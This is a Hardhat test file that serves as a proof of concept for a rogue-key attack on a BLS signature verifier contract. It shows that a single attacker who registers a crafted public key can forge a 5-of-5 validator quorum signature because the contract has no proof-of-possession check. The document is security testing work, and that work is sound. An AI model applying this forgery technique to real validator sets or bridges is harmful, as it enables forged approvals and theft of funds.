/**
 * Rogue Key Attack — Proof of Concept (Threat T1)
 *
 * Demonstrates that BLSVerifier.verifyBLSSignature has no proof-of-possession
 * check, so a single attacker can register a crafted public key that cancels
 * out all honest validators and then forge any quorum signature alone.
 */

import { expect } from "chai";
import { ethers } from "hardhat";

// @noble/curves 1.9.7 API
const { bn254 } = require('@noble/curves/bn254');

// =========================================================================
// Type Definitions
// =========================================================================

type G1Point = ReturnType<typeof bn254.G1.toAffine>;
type G2Point = ReturnType<typeof bn254.G2.toAffine>;

// =========================================================================
// Helper Functions
// =========================================================================

/**
 * Convert G2 point (affine) to validator key format [x.c0, x.c1, y.c0, y.c1]
 */
function g2PointToValidatorKey(pt: G2Point): [bigint, bigint, bigint, bigint] {
    return [pt.x.c0, pt.x.c1, pt.y.c0, pt.y.c1];
}

/**
 * Convert G1 point to signature bytes (64 bytes: x || y)
 */
function g1PointToSignatureBytes(pt: G1Point): string {
    const xHex = ethers.zeroPadValue(ethers.toBeHex(pt.x), 32);
    const yHex = ethers.zeroPadValue(ethers.toBeHex(pt.y), 32);
    return ethers.concat([xHex, yHex]);
}

// =========================================================================
// Test Suite
// =========================================================================

describe("BLSVerifier — Rogue Key Attack PoC (Threat T1)", function () {
    let blsVerifierTest: any;

    const DOMAIN   = ethers.keccak256(ethers.toUtf8Bytes("sevap is in the house!"));
    const MSG_HASH = ethers.keccak256(ethers.toUtf8Bytes("test message to sign"));

    before(async () => {
        const Factory = await ethers.getContractFactory("BLSVerifierTest");
        blsVerifierTest = await Factory.deploy();
    });

    // =====================================================================
    it("single attacker forges a 5-of-5 quorum signature using a rogue key", async () => {
        console.log("\n=== ROGUE KEY ATTACK TEST ===\n");

        // --- Step 1: Get curve generators ---
        const G1_GEN = bn254.G1.ProjectivePoint.BASE;
        const G2_GEN = bn254.G2.ProjectivePoint.BASE;

        console.log("✓ Retrieved G1 and G2 generators");

        // --- Step 2: Generate 4 honest validator keys ---
        const honestSKs = [100n, 200n, 300n, 400n];
        const honestPKs_proj = honestSKs.map((sk) => G2_GEN.multiply(sk));
        const honestPKs = honestPKs_proj.map((pt) => pt.toAffine());

        console.log("✓ Generated", honestPKs.length, "honest validator keys");

        // --- Step 3: Compute aggregate of honest keys ---
        const honestAggregate_proj = honestPKs_proj.reduce(
            (acc, pk) => acc.add(pk),
            bn254.G2.ProjectivePoint.ZERO
        );

        // --- Step 4: Compute rogue key ---
        // PK_rogue = SK_rogue * G2 - honestAggregate
        const SK_rogue = 1337n;
        const PK_rogue_proj = G2_GEN.multiply(SK_rogue).subtract(honestAggregate_proj);
        const PK_rogue = PK_rogue_proj.toAffine();

        console.log("✓ Computed rogue public key (SK=", SK_rogue, ")");

        // Verify aggregation property
        const allKeysAggregate_proj = honestAggregate_proj.add(PK_rogue_proj);
        const expectedAggregate_proj = G2_GEN.multiply(SK_rogue);
        expect(allKeysAggregate_proj.equals(expectedAggregate_proj)).to.be.true;
        console.log("✓ Verified: sum of all keys = SK_rogue * G2");

        // --- Step 5: Build validator set ---
        const validatorSet = [
            ...honestPKs.map((pk) => ({ key: g2PointToValidatorKey(pk) })),
            { key: g2PointToValidatorKey(PK_rogue) },
        ];

        console.log("✓ Built validator set with", validatorSet.length, "validators");

        // --- Step 6: Get message point from contract ---
        const rawPoint: [bigint, bigint] = (
            await blsVerifierTest.hashToPoint(
                ethers.getBytes(MSG_HASH),
                ethers.getBytes(DOMAIN)
            )
        ).map(BigInt);

        const msgPoint_proj = bn254.G1.ProjectivePoint.fromAffine({
            x: rawPoint[0],
            y: rawPoint[1],
        });
        const msgPoint = msgPoint_proj.toAffine();

        console.log("✓ Retrieved message point from contract");

        // --- Step 7: Forge signature ---
        // sig = SK_rogue * H(message)
        const forgedSig_proj = msgPoint_proj.multiply(SK_rogue);
        const forgedSig = forgedSig_proj.toAffine();
        const sigBytes = g1PointToSignatureBytes(forgedSig);

        console.log("✓ Forged signature:", sigBytes.slice(0, 20) + "...");

        // --- Step 8: Verify ---
        const result = await blsVerifierTest.verifyBLSSignature(
            MSG_HASH,
            sigBytes,
            0b11111n,
            validatorSet,
            DOMAIN
        );

        expect(result).to.equal(true);
        console.log("\n✓✓✓ ROGUE KEY ATTACK SUCCESSFUL ✓✓✓\n");
    });

    // =====================================================================
    it("sanity: a different private key does not produce a valid forgery", async () => {
        console.log("\n=== SANITY CHECK TEST ===\n");

        const G1_GEN = bn254.G1.ProjectivePoint.BASE;
        const G2_GEN = bn254.G2.ProjectivePoint.BASE;

        const honestSKs = [100n, 200n, 300n, 400n];
        const honestPKs_proj = honestSKs.map((sk) => G2_GEN.multiply(sk));
        const honestPKs = honestPKs_proj.map((pt) => pt.toAffine());

        const honestAggregate_proj = honestPKs_proj.reduce(
            (acc, pk) => acc.add(pk),
            bn254.G2.ProjectivePoint.ZERO
        );

        const SK_rogue = 1337n;
        const PK_rogue_proj = G2_GEN.multiply(SK_rogue).subtract(honestAggregate_proj);
        const PK_rogue = PK_rogue_proj.toAffine();

        const validatorSet = [
            ...honestPKs.map((pk) => ({ key: g2PointToValidatorKey(pk) })),
            { key: g2PointToValidatorKey(PK_rogue) },
        ];

        const rawPoint: [bigint, bigint] = (
            await blsVerifierTest.hashToPoint(
                ethers.getBytes(MSG_HASH),
                ethers.getBytes(DOMAIN)
            )
        ).map(BigInt);

        const msgPoint_proj = bn254.G1.ProjectivePoint.fromAffine({
            x: rawPoint[0],
            y: rawPoint[1],
        });

        // Sign with WRONG key
        const WRONG_SK = 9999n;
        const wrongSig_proj = msgPoint_proj.multiply(WRONG_SK);
        const wrongSig = wrongSig_proj.toAffine();
        const wrongSigBytes = g1PointToSignatureBytes(wrongSig);

        const result = await blsVerifierTest.verifyBLSSignature(
            MSG_HASH,
            wrongSigBytes,
            0b11111n,
            validatorSet,
            DOMAIN
        );

        expect(result).to.equal(false);
        console.log("✓ Sanity check passed: wrong key rejected\n");
    });
});
